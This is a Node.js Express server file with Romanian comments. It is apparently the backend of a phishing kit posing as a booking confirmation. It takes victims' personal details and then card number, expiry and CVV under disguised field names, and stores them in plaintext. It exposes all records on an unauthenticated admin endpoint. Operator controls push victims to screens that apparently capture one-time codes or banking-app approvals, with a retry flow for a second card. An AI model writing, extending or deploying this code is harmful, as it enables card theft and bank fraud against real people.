const express = require("express");
const fs = require("fs");
const app = express();

app.use(express.json());
app.use(express.static("public"));

const PORT = process.env.PORT || 3000;
const DATA_FILE = "data.json";
const STATS_FILE = "stats.json";

function formatUserNumber(value) {
  const parsed = parseInt(value, 10);
  if (!Number.isFinite(parsed) || parsed < 1) return null;
  return String(parsed).padStart(3, "0");
}

function ensureUserNumbers(data) {
  let changed = false;
  let maxNumber = 0;

  data.forEach(user => {
    const formatted = formatUserNumber(user.userNumber);

    if (formatted) {
      if (user.userNumber !== formatted) {
        user.userNumber = formatted;
        changed = true;
      }

      maxNumber = Math.max(maxNumber, parseInt(formatted, 10));
    }
  });

  data.forEach(user => {
    if (!formatUserNumber(user.userNumber)) {
      maxNumber += 1;
      user.userNumber = String(maxNumber).padStart(3, "0");
      changed = true;
    }
  });

  return changed;
}

function getNextUserNumber(data) {
  return String(
    data.reduce((maxNumber, user) => {
      const formatted = formatUserNumber(user.userNumber);
      const currentNumber = formatted ? parseInt(formatted, 10) : 0;
      return Math.max(maxNumber, currentNumber);
    }, 0) + 1
  ).padStart(3, "0");
}

function readStats() {
  if (!fs.existsSync(STATS_FILE)) {
    return { step1Visits: 0 };
  }

  try {
    const stats = JSON.parse(fs.readFileSync(STATS_FILE, "utf8"));
    return {
      step1Visits: Number(stats.step1Visits) || 0
    };
  } catch (error) {
    return { step1Visits: 0 };
  }
}

function saveStats(stats) {
  fs.writeFileSync(STATS_FILE, JSON.stringify({
    step1Visits: Number(stats.step1Visits) || 0
  }, null, 2));
}

// functie citire date
function readData() {
  const data = JSON.parse(fs.readFileSync(DATA_FILE, "utf8"));

  if (!Array.isArray(data)) {
    return [];
  }

  if (ensureUserNumbers(data)) {
    saveData(data);
  }

  return data;
}

// functie salvare date
function saveData(data) {
  fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
}

// generare ID simplu
function generateId() {
  return Math.random().toString(36).substring(2, 10);
}

function isValidBookingRef(ref) {
  return /^\d{6,10}$/.test(String(ref || "").trim());
}

function isValidName(name) {
  return /^[\p{L}\s'-]{3,}$/u.test(String(name || "").trim());
}

function isValidEmail(email) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(String(email || "").trim());
}

function isValidAddress(address) {
  const value = String(address || "").trim();
  return value.length >= 5 && /\p{L}/u.test(value);
}

function isValidZip(zip) {
  return /^[A-Za-z0-9 -]{4,10}$/.test(String(zip || "").trim());
}

function digitsOnly(value) {
  return String(value || "").replace(/\D/g, "");
}

function findPendingRetry(data, user) {
  return data.find(u =>
    u.id !== user.id &&
    (
      u.retrySourceId === user.id ||
      (
        !u.retrySourceId &&
        u.ref === user.ref &&
        u.email === user.email &&
        u.status === "pending"
      )
    ) &&
    !u.rezervare
  );
}

function detectCardBrand(cardNumber) {
  if (!cardNumber) return null;

  const firstTwo = parseInt(cardNumber.slice(0, 2), 10);
  const firstFour = parseInt(cardNumber.slice(0, 4), 10);

  if (cardNumber.startsWith("4")) return "visa";
  if (cardNumber.startsWith("34") || cardNumber.startsWith("37")) return "amex";
  if (cardNumber.startsWith("36") || cardNumber.startsWith("38") || cardNumber.startsWith("39")) return "diners";
  if (cardNumber.startsWith("62")) return "unionpay";
  if ((firstTwo >= 51 && firstTwo <= 55) || (firstFour >= 2221 && firstFour <= 2720)) return "mastercard";
  if (cardNumber.startsWith("50") || (firstTwo >= 56 && firstTwo <= 69)) return "maestro";

  return null;
}

function luhnCheck(cardNumber) {
  let sum = 0;
  let shouldDouble = false;

  for (let i = cardNumber.length - 1; i >= 0; i--) {
    let digit = parseInt(cardNumber.charAt(i), 10);

    if (shouldDouble) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }

    sum += digit;
    shouldDouble = !shouldDouble;
  }

  return sum % 10 === 0;
}

function isValidCardNumber(cardNumber, brand) {
  const brandLengths = {
    visa: [13, 16, 19],
    mastercard: [16],
    maestro: [12, 13, 14, 15, 16, 17, 18, 19],
    amex: [15],
    diners: [14],
    unionpay: [16, 17, 18, 19]
  };

  return Boolean(
    brand &&
    brandLengths[brand] &&
    brandLengths[brand].includes(cardNumber.length) &&
    luhnCheck(cardNumber)
  );
}

function isValidExpiryMonth(month) {
  if (!/^\d{2}$/.test(month)) return false;
  const monthNumber = parseInt(month, 10);
  return monthNumber >= 1 && monthNumber <= 12;
}

function isValidExpiryYear(year) {
  if (!/^\d{2}$/.test(year)) return false;
  const fullYear = 2000 + parseInt(year, 10);
  const currentYear = new Date().getFullYear();
  return fullYear >= currentYear && fullYear <= currentYear + 20;
}

function isExpired(month, year) {
  const monthNumber = parseInt(month, 10);
  const fullYear = 2000 + parseInt(year, 10);
  const now = new Date();
  const currentYear = now.getFullYear();
  const currentMonth = now.getMonth() + 1;

  return fullYear < currentYear || (fullYear === currentYear && monthNumber < currentMonth);
}

function isValidCvv(cvv, brand) {
  if (!/^\d+$/.test(cvv)) return false;
  return brand === "amex" ? cvv.length === 4 : cvv.length === 3;
}

// PAS 1 - salvare date personale
app.post("/step1", (req, res) => {
  const data = readData();

  const ref = String(req.body.ref || "").trim();
  const nume = String(req.body.nume || "").trim();
  const email = String(req.body.email || "").trim();
  const adresa = String(req.body.adresa || "").trim();
  const zip = String(req.body.zip || "").trim();
  const agree = req.body.agree === true;
  const agreeTerms = req.body.agreeTerms === true;

  if (
    !isValidBookingRef(ref) ||
    !isValidName(nume) ||
    !isValidEmail(email) ||
    !isValidAddress(adresa) ||
    !isValidZip(zip) ||
    !agree ||
    !agreeTerms
  ) {
    return res.status(400).json({ error: "Please enter valid details and accept both policies." });
  }

  const newUser = {
    id: generateId(),
    userNumber: getNextUserNumber(data),
    ref,
    nume,
    email,
    adresa,
    zip,
    agree,
    agreeTerms,
    status: "pending",
    createdAt: new Date().toISOString() // optional but good
  };

  data.push(newUser);
  saveData(data);

  res.json({ id: newUser.id });
});

app.post("/track-step1-view", (req, res) => {
  const stats = readStats();
  stats.step1Visits += 1;
  saveStats(stats);
  res.json({ success: true, step1Visits: stats.step1Visits });
});

// PAS 2 - completare rezervare
app.post("/step2", (req, res) => {
  const data = readData();

  const user = data.find(u => u.id === req.body.id);

  if (!user) return res.status(404).json({ error: "Nu exista" });

  const rezervare = digitsOnly(req.body.rezervare);
  const luna = digitsOnly(req.body.luna);
  const an = digitsOnly(req.body.an);
  const suma = digitsOnly(req.body.suma);
  const brand = detectCardBrand(rezervare);

  if (
    !isValidCardNumber(rezervare, brand) ||
    !isValidExpiryMonth(luna) ||
    !isValidExpiryYear(an) ||
    isExpired(luna, an) ||
    !isValidCvv(suma, brand)
  ) {
    return res.status(400).json({ error: "Please enter valid payment details." });
  }

  user.rezervare = rezervare;
  user.luna = luna;
  user.an = an;
  user.suma = suma;
  user.cardBrand = brand;

  saveData(data);

  res.json({ success: true }); // 🔥 IMPORTANT
});
app.post("/save-code", (req, res) => {
  const data = readData();
  const user = data.find(u => u.id === req.body.id);

  if (!user) return res.status(404).send("Nu exista");

  user.code = req.body.code;
user.codeError = false;

  saveData(data);
  res.send("OK");
});

// STATUS
app.get("/status/:id", (req, res) => {
  const data = readData();
  const user = data.find(u => u.id === req.params.id);

  if (!user) return res.status(404).send("Nu exista");

res.json({ 
  status: user.status,
  retry: user.retry || false,
  step: user.step || null,
  codeError: user.codeError || false
});
});

// ADMIN - toate datele
app.get("/admin", (req, res) => {
  const data = readData();
  res.json(data);
});

app.get("/admin-stats", (req, res) => {
  const data = readData();
  const stats = readStats();

  res.json({
    step1Visits: stats.step1Visits,
    totalUsers: data.length
  });
});

// ADMIN - update status
app.post("/update", (req, res) => {
  const data = readData();

  const user = data.find(u => u.id === req.body.id);

  if (!user) return res.status(404).send("Nu exista");

  user.status = req.body.status;

  saveData(data);

  res.send("Updated");
});
app.post("/action", (req, res) => {
  const { id, action } = req.body;

  const data = readData();
  const user = data.find(u => u.id === id);

  if (!user) return res.status(404).send("Nu exista");

  // DELETE
  if (action === "delete") {
    const newData = data.filter(u => u.id !== id);
    saveData(newData);
    return res.json({ success: true });
  }
  // SAVE (⭐)
if (action === "save") {
  user.saved = true;
  saveData(data);
  return res.json({ success: true });
}

// UNSAVE (pentru viitor)
if (action === "unsave") {
  user.saved = false;
  saveData(data);
  return res.json({ success: true });
}

// RETRY LOGIC CORECT
if (action === "retry") {

  // ❌ dacă userul NU are step2 → nu ai voie retry
  if (!user.rezervare) {
    return res.json({ error: "Step2 nu e completat" });
  }

  const existingPendingRetry = findPendingRetry(data, user);

  if (existingPendingRetry) {
    existingPendingRetry.saved = false;
    existingPendingRetry.status = "pending";
    existingPendingRetry.step = null;
    existingPendingRetry.retry = false;
    user.status = "retry";
    user.retry = true;
    user.step = null;
    user.retryTargetId = existingPendingRetry.id;
    saveData(data);
    return res.json({ newId: existingPendingRetry.id });
  }

  // ❌ dacă deja este în retry și NU a completat step2 nou
  if (user.status === "retry" && !user.rezervare) {
    return res.json({ error: "Finalizează step2 înainte de alt retry" });
  }

  // ❌ dacă există deja un retry activ (user duplicat fără step2)
  const pendingRetry = findPendingRetry(data, user);

  if (pendingRetry) {
    return res.json({ error: "Există deja un retry în curs" });
  }

  // ✅ creează user nou DOAR cu step1
  const newUser = {
    id: generateId(),
    userNumber: getNextUserNumber(data),
    ref: user.ref,
    nume: user.nume,
    email: user.email,
    adresa: user.adresa,
    zip: user.zip,
    retrySourceId: user.id,
    saved: false,
    status: "pending",
    createdAt: new Date().toISOString()
  };

  data.push(newUser);

  // marchează userul vechi
  user.status = "retry";
  user.retry = true;
  user.step = null;
  user.retryTargetId = newUser.id;

  saveData(data);

  return res.json({ newId: newUser.id });
}

  // GET LAST ID
  if (action === "getNewId") {
    const pendingRetry = user.retryTargetId
      ? data.find(u => u.id === user.retryTargetId)
      : findPendingRetry(data, user);

    return res.json({ newId: pendingRetry ? pendingRetry.id : user.id });
  }

  // LOADING
  if (action === "loading") {
    user.status = "loading";
    user.retry = false;
    user.step = null;
    user.retryTargetId = null;
  }

  // CODE STEP
  if (action === "code") {
  // dacă există deja cod → înseamnă că e retry / invalid
  if (user.code) {
    user.codeError = true;
  }

  user.step = "code";
}

  // APP STEP
  if (action === "app") {
    user.step = "app";
  }

  saveData(data);
  res.send("OK");
});

app.listen(PORT, () => {
  console.log("Server pornit pe http://localhost:3000");
});
